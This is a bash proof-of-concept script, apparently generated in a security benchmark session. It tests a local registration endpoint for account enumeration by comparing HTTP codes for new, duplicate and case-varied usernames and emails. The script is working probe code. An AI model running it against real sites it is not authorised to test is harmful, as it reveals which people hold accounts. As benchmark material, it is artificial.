#!/bin/bash
# POC: Demonstrates account enumeration vulnerability by detecting different HTTP response codes for duplicate vs new accounts on registration endpoint
# Target: ./repo
# Created: 2025-12-02T16:20:40.243Z
# Session: benchmark-XBEN-069-24-miorxjei

# Account Enumeration via Error-Based Detection POC
# Demonstrates that the /api/register.php endpoint reveals account existence
# through different HTTP response codes (200 for new, 500 for duplicates)

TARGET_URL="http://localhost:8080/api/register.php"
TIMESTAMP=$(date +%s%N)

echo "=== Account Enumeration via Error-Based Detection POC ==="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Register a new unique account (baseline)
echo "[*] Test 1: Registering new unique account..."
UNIQUE_USERNAME="enumtest_${TIMESTAMP:0:10}"
UNIQUE_EMAIL="enumtest_${TIMESTAMP:0:10}@test.com"

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=${UNIQUE_USERNAME}&password=test123&email=${UNIQUE_EMAIL}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[+] Response Code: $HTTP_CODE"
echo "[+] Response Body: $BODY"
echo ""

# Verify Test 1 succeeded (should be 200)
if [ "$HTTP_CODE" != "200" ]; then
    echo "[-] ERROR: Initial registration failed. Cannot proceed with enumeration test."
    exit 1
fi

# Test 2: Attempt duplicate username
echo "[*] Test 2: Attempting registration with duplicate username..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=${UNIQUE_USERNAME}&password=different123&email=different_${TIMESTAMP:0:10}@test.com")

HTTP_CODE_DUP_USER=$(echo "$RESPONSE" | tail -n1)
BODY_DUP_USER=$(echo "$RESPONSE" | head -n-1)

echo "[+] Response Code: $HTTP_CODE_DUP_USER"
echo "[+] Response Body: $BODY_DUP_USER"
echo ""

# Test 3: Attempt duplicate email
echo "[*] Test 3: Attempting registration with duplicate email..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=newuser_${TIMESTAMP:0:10}&password=test123&email=${UNIQUE_EMAIL}")

HTTP_CODE_DUP_EMAIL=$(echo "$RESPONSE" | tail -n1)
BODY_DUP_EMAIL=$(echo "$RESPONSE" | head -n-1)

echo "[+] Response Code: $HTTP_CODE_DUP_EMAIL"
echo "[+] Response Body: $BODY_DUP_EMAIL"
echo ""

# Test 4: Case variation of existing username
echo "[*] Test 4: Attempting registration with case variation of existing username..."
CASE_VARIATION=$(echo "$UNIQUE_USERNAME" | tr 'a-z' 'A-Z')
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=${CASE_VARIATION}&password=test123&email=casetest_${TIMESTAMP:0:10}@test.com")

HTTP_CODE_CASE=$(echo "$RESPONSE" | tail -n1)
BODY_CASE=$(echo "$RESPONSE" | head -n-1)

echo "[+] Response Code: $HTTP_CODE_CASE"
echo "[+] Response Body: $BODY_CASE"
echo ""

# Analysis
echo "=== VULNERABILITY ANALYSIS ==="
echo ""
echo "New Account Registration:      HTTP $HTTP_CODE"
echo "Duplicate Username:            HTTP $HTTP_CODE_DUP_USER"
echo "Duplicate Email:               HTTP $HTTP_CODE_DUP_EMAIL"
echo "Case Variation of Existing:    HTTP $HTTP_CODE_CASE"
echo ""

# Check if vulnerability exists
if [ "$HTTP_CODE" = "200" ] && [ "$HTTP_CODE_DUP_USER" != "200" ]; then
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    - New accounts return HTTP $HTTP_CODE (success)"
    echo "    - Duplicate accounts return HTTP $HTTP_CODE_DUP_USER (error)"
    echo "    - This allows reliable account enumeration"
    echo ""
    
    if [ "$HTTP_CODE_DUP_EMAIL" != "200" ]; then
        echo "[!] Email enumeration also confirmed (duplicate email returns HTTP $HTTP_CODE_DUP_EMAIL)"
    fi
    
    if [ "$HTTP_CODE_CASE" != "200" ]; then
        echo "[!] Case-insensitive matching detected (case variation returns HTTP $HTTP_CODE_CASE)"
    fi
    
    exit 0
else
    echo "[-] Vulnerability not confirmed or different behavior detected"
    exit 1
fi